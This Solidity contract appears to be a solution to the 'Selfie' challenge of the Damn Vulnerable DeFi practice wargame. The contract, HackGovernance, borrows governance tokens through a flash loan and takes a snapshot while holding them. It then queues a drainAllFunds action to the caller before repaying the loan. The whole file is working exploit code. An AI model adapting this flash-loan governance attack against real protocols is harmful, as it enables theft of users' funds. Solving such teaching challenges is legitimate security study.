// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract HackGovernance {
    SimpleGovernance public governance;
    SelfiePool public selfie;
    address owner;

    constructor(address governanceAddress, address selfiePool) {
        governance = SimpleGovernance(governanceAddress);
        selfie = SelfiePool(selfiePool);
    }

    function callFlashLoan(uint256 borrowAmount) public {
        owner = msg.sender;
        selfie.flashLoan(borrowAmount);
    }

    function receiveTokens(address token, uint256 borrowAmount) public {
        DamnValuableTokenSnapshot(token).snapshot();
        require(DamnValuableTokenSnapshot(token).getBalanceAtLastSnapshot(address(this))==borrowAmount,"Failed");
        console.log("owner: %s",owner);
        bytes memory data=abi.encodeWithSignature('drainAllFunds(address)',owner);
        console.log("id: %s",governance.queueAction(address(selfie),data,0));

        DamnValuableTokenSnapshot(token).transfer(msg.sender,borrowAmount);
    }
}